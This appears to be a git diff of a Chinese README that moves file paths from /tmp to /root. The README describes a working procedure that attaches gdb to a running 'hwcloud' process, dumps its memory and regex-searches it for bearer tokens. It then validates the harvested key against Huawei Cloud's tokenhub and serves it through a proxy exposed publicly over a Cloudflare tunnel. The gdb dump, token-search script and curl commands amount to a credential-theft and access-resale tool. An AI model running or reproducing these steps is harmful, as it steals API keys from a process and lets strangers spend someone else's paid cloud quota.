@@ -34,7 +34,7 @@ bash scripts/extract_key.sh
 1. 用 gdb dump 进程内存，搜索 `Authorization: Bearer <token>` 模式
 2. 支持超长 key（30-2000 字符），按长度降序排列候选
 3. 逐个自动验证候选 key（向 tokenhub 发测试请求）
-4. 验证成功后保存到 `/tmp/working_api_key.txt`
+4. 验证成功后保存到 `/root/working_api_key.txt`
 
 **手动提取（备选）：**
 
@@ -42,18 +42,18 @@ bash scripts/extract_key.sh
 PID=$(pgrep -f hwcloud | head -1)
 
 # gdb dump 全部内存
-gdb -batch -ex "attach $PID" -ex "dump memory /tmp/mem.bin 0 0xffffffff" -ex "detach"
+gdb -batch -ex "attach $PID" -ex "dump memory /root/mem.bin 0 0xffffffff" -ex "detach"
 
 # 搜索 Bearer token（注意：key 可能超过 1000 字符）
 python3 -c "
 import re
-data = open('/tmp/mem.bin','rb').read().decode('utf-8','ignore')
+data = open('/root/mem.bin','rb').read().decode('utf-8','ignore')
 for m in re.finditer(r'Authorization:\s*Bearer\s+([A-Za-z0-9_\-+/=\.]{30,2000})', data):
     print(m.group(1))
 " | sort -u | head -5
 
 # 验证找到的 key
-curl -s -H "Authorization: Bearer $(cat /tmp/working_api_key.txt)" \
+curl -s -H "Authorization: Bearer $(cat /root/working_api_key.txt)" \
   https://tokenhub.developer.huaweicloud.com/v2/models | python3 -m json.tool
 ```
 
@@ -61,7 +61,7 @@ curl -s -H "Authorization: Bearer $(cat /tmp/working_api_key.txt)" \
 
 ```bash
 export PROXY_PORT=9997
-export UPSTREAM_API_KEY="$(cat /tmp/working_api_key.txt)"
+export UPSTREAM_API_KEY="$(cat /root/working_api_key.txt)"
 bash scripts/setup.sh
 ```
 
@@ -69,7 +69,7 @@ bash scripts/setup.sh
 1. 检查环境（Python、pip）
 2. 安装依赖（fastapi、httpx、uvicorn）
 3. 部署代理脚本到 `/root/glm-proxy/`
-4. 生成代理 API Key（保存到 `/tmp/proxy_api_key.txt`）
+4. 生成代理 API Key（保存到 `/root/proxy_api_key.txt`）
 5. 启动代理服务
 6. 健康检查
 
@@ -104,8 +104,8 @@ chmod +x /usr/local/bin/cloudflared
 
 # 启动隧道
 export CF_TUNNEL_TOKEN="eyJxxx你的tunnel_token"
-nohup cloudflared tunnel run --token "$CF_TUNNEL_TOKEN" > /tmp/cloudflared.log 2>&1 &
-echo $! > /tmp/cloudflared.pid
+nohup cloudflared tunnel run --token "$CF_TUNNEL_TOKEN" > /root/cloudflared.log 2>&1 &
+echo $! > /root/cloudflared.pid
 ```
 
 或者直接用安装脚本一步到位：
@@ -121,30 +121,30 @@ CF_TUNNEL_TOKEN="eyJxxx你的tunnel_token" bash scripts/setup.sh
 curl http://localhost:9997/health
 
 # 2. 模型列表
-curl -H "Authorization: Bearer $(cat /tmp/proxy_api_key.txt)" \
+curl -H "Authorization: Bearer $(cat /root/proxy_api_key.txt)" \
   http://localhost:9997/v1/models
 
 # 3. 普通对话
 curl -X POST http://localhost:9997/v1/chat/completions \
-  -H "Authorization: Bearer $(cat /tmp/proxy_api_key.txt)" \
+  -H "Authorization: Bearer $(cat /root/proxy_api_key.txt)" \
   -H "Content-Type: application/json" \
   -d '{"model":"glm-5.2","messages":[{"role":"user","content":"你好"}]}'
 
 # 4. Thinking 模式（xhigh 推理强度）
 curl -X POST http://localhost:9997/v1/chat/completions \
-  -H "Authorization: Bearer $(cat /tmp/proxy_api_key.txt)" \
+  -H "Authorization: Bearer $(cat /root/proxy_api_key.txt)" \
   -H "Content-Type: application/json" \
   -d '{"model":"glm-5.2","messages":[{"role":"user","content":"证明根号2是无理数"}],"reasoning_effort":"xhigh"}'
 
 # 5. 流式响应
 curl -X POST http://localhost:9997/v1/chat/completions \
-  -H "Authorization: Bearer $(cat /tmp/proxy_api_key.txt)" \
+  -H "Authorization: Bearer $(cat /root/proxy_api_key.txt)" \
   -H "Content-Type: application/json" \
   -d '{"model":"glm-5.2","messages":[{"role":"user","content":"你好"}],"stream":true}'
 
 # 6. 公网访问（替换为glm.zeroo.ggff.net）
 curl -X POST https://glm.zeroo.ggff.net/v1/chat/completions \
-  -H "Authorization: Bearer $(cat /tmp/proxy_api_key.txt)" \
+  -H "Authorization: Bearer $(cat /root/proxy_api_key.txt)" \
   -H "Content-Type: application/json" \
   -d '{"model":"glm-5.2","messages":[{"role":"user","content":"你好"}]}'
 ```
@@ -157,7 +157,7 @@ curl -X POST https://glm.zeroo.ggff.net/v1/chat/completions \
 from openai import OpenAI
 
 client = OpenAI(
-    api_key="你的代理API_KEY",  # /tmp/proxy_api_key.txt 中的值
+    api_key="你的代理API_KEY",  # /root/proxy_api_key.txt 中的值
     base_url="https://glm.zeroo.ggff.net/v1"
 )
 
@@ -185,20 +185,20 @@ print(response.choices[0].message.reasoning_content)  # 推理过程
 curl http://localhost:9997/health
 
 # 查看日志
-tail -f /tmp/glm_proxy.log
+tail -f /root/glm_proxy.log
 
 # 重启代理
-kill $(cat /tmp/glm_proxy.pid)
-PROXY_PORT=9997 nohup python3 /root/glm-proxy/glm_proxy.py > /tmp/glm_proxy.log 2>&1 &
-echo $! > /tmp/glm_proxy.pid
+kill $(cat /root/glm_proxy.pid)
+PROXY_PORT=9997 nohup python3 /root/glm-proxy/glm_proxy.py > /root/glm_proxy.log 2>&1 &
+echo $! > /root/glm_proxy.pid
 
 # 重启隧道
-kill $(cat /tmp/cloudflared.pid)
-nohup cloudflared tunnel run --token "$(cat /tmp/cf_tunnel_token.txt)" > /tmp/cloudflared.log 2>&1 &
-echo $! > /tmp/cloudflared.pid
+kill $(cat /root/cloudflared.pid)
+nohup cloudflared tunnel run --token "$(cat /root/cf_tunnel_token.txt)" > /root/cloudflared.log 2>&1 &
+echo $! > /root/cloudflared.pid
 
 # 停止所有
-kill $(cat /tmp/glm_proxy.pid) $(cat /tmp/cloudflared.pid) 2>/dev/null
+kill $(cat /root/glm_proxy.pid) $(cat /root/cloudflared.pid) 2>/dev/null
 ```
 
 ## 可调参数（环境变量）
@@ -242,7 +242,7 @@ kill $(cat /tmp/glm_proxy.pid) $(cat /tmp/cloudflared.pid) 2>/dev/null
 | 上游 504 超时 | 降低 reasoning_effort 级别 |
 | CF 524 超时 | 确保使用最新版代理脚本（v2.1+ 有空白保活） |
 | 连接池失效 | 重启代理服务，或等待自动重建 |
-| API Key 401 | 检查 `/tmp/proxy_api_key.txt` 和 Authorization header |
+| API Key 401 | 检查 `/root/proxy_api_key.txt` 和 Authorization header |
 | 公网无法访问 | 检查 cloudflared 进程和 Tunnel 配置 |
 | 环境重启后失效 | 需重新提取 API Key 并重启服务 |
 | 提取 Key 失败 | 确认 hwcloud 正在运行；key 可能超过 1000 字符，用 v2 提取脚本 |
